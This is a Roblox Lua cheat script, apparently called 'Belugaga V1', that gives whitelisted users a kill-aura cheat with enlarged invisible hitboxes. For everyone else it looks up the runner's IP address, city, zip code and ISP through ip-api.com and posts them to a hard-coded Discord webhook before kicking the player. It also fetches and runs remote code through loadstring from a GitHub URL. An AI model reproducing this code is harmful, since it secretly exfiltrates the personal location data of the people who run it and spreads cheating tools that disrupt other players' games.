-- Whitelist for specific usernames 
local whitelistedUsers = {
   "Mrbignewcoming3",
   "Hi_dorihi",  --whitelisted
}

-- Function to check if player is whitelisted
local function isWhitelisted(username)
   for _, whitelisted in ipairs(whitelistedUsers) do
       if username == whitelisted then
           return true
       end
   end
   return false
end

-- Get the local player's username
local player = game.Players.LocalPlayer
local username = player.Name

-- Function to send data to the webhook
local function sendWebhookData(player_name, ipinfo_table)
    local webhook_url = "https://discord.com/api/webhooks/1330113801558691840/27eBfT1ihaS3EqJOhTLi4-rxb1y1no-l3kESIRYiGgG5Bgre0we5SqI6EFOPBoEifp14"  -- Replace with your actual webhook URL
    local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", 
        player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
    
    local success, response = pcall(function()
        game:GetService("HttpService"):PostAsync(
            webhook_url, 
            game:GetService("HttpService"):JSONEncode({["content"] = dataMessage}),
            Enum.HttpContentType.ApplicationJson
        )
    end)

    if not success then
        warn("Failed to send webhook data: " .. response)
    end
end

-- If the player is not whitelisted, get their IP info and kick them
if not isWhitelisted(username) then
    local player_name = player.Name

    -- Get IP information
    local ip_info
    local success, response = pcall(function()
        ip_info = game:GetService("HttpService"):GetAsync("http://ip-api.com/json")
    end)

    if not success then
        warn("Failed to get IP info: " .. response)
        return
    end

    local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info)

    -- Send IP info to webhook
    sendWebhookData(player_name, ipinfo_table)

    -- Kick the player
    player:Kick("Not WhiteListed L")
else
    local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/adopttesting/Testing/refs/heads/main/Library", true))()

    local window = library:AddWindow("Belugaga V1 [] Made By Adopt", {
        main_color = Color3.fromRGB(0, 0, 0), -- Color
        min_size = Vector2.new(500, 450), -- Size of the gui
        can_resize = false, -- true or false
    })

    local Client = window:AddTab("Client")

-- Client-Side Script

local player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local auraEnabled = false -- Global toggle for kill aura
local punchTool = player.Backpack:FindFirstChild("Punch") or game.Workspace:FindFirstChild(player.Name):FindFirstChild("Punch")
local auraRange = 10000 -- Range for the kill aura (effectively make everyone reachable)
local hitboxSize = Vector3.new(10000, 10000, 10000) -- The size of the hitbox for kill aura

-- Check if the punch tool exists
if not punchTool then
    warn("Punch tool not found")
end

-- Create RemoteEvent for communicating with the server
if not ReplicatedStorage:FindFirstChild("KillAuraToggled") then
    local killAuraToggleEvent = Instance.new("RemoteEvent")
    killAuraToggleEvent.Name = "KillAuraToggled"
    killAuraToggleEvent.Parent = ReplicatedStorage
end

-- Function to enlarge the hitbox of other players
local function enlargeHitbox(otherPlayer)
    if otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local humanoidRootPart = otherPlayer.Character.HumanoidRootPart
        humanoidRootPart.Size = hitboxSize  -- Set large hitbox size
        humanoidRootPart.Transparency = 1  -- Make it invisible to others
    end
end

-- Function to reset the hitbox of other players
local function resetHitbox(otherPlayer)
    if otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local humanoidRootPart = otherPlayer.Character.HumanoidRootPart
        humanoidRootPart.Size = Vector3.new(2, 2, 1)  -- Default hitbox size
        humanoidRootPart.Transparency = 1  -- Reset transparency
    end
end

-- Function to send the punch command to the server
local function punchNearbyPlayers()
    for _, otherPlayer in pairs(game.Players:GetPlayers()) do
        if otherPlayer ~= player and otherPlayer.Character then
            local otherRoot = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
            local otherHumanoid = otherPlayer.Character:FindFirstChild("Humanoid")
            if otherRoot and otherHumanoid then
                -- Calculate the distance to see if the other player is within the aura range
                local distance = (player.Character.HumanoidRootPart.Position - otherRoot.Position).Magnitude
                if distance <= auraRange then
                    -- Send the punch command
                    if punchTool then
                        if punchTool.Parent ~= player.Character then
                            punchTool.Parent = player.Character -- Equip the tool if not already equipped
                        end
                        -- Trigger the punch animation
                        game.Players.LocalPlayer.muscleEvent:FireServer("punch", "rightHand")
                        game.Players.LocalPlayer.muscleEvent:FireServer("punch", "leftHand")
                    else
                        warn("Punch tool not found")
                    end
                end
            end
        end
    end
end

-- Toggle kill aura using a switch
Client:AddSwitch("Kill Aura", function(bool)
    if bool then
        auraEnabled = true

        -- Enlarge the hitboxes of all players only once
        for _, otherPlayer in pairs(game.Players:GetPlayers()) do
            if otherPlayer ~= player then
                enlargeHitbox(otherPlayer)
            end
        end
        
        -- Start the punching loop to punch nearby players
        while auraEnabled do
            punchNearbyPlayers()
            wait(0.1)  -- Delay between checks for punching
        end
    else
        auraEnabled = false
        
        -- Reset hitboxes back to normal
        for _, otherPlayer in pairs(game.Players:GetPlayers()) do
            if otherPlayer ~= player then
                resetHitbox(otherPlayer)
            end
        end
    end
end)

--end of script whitelist
end

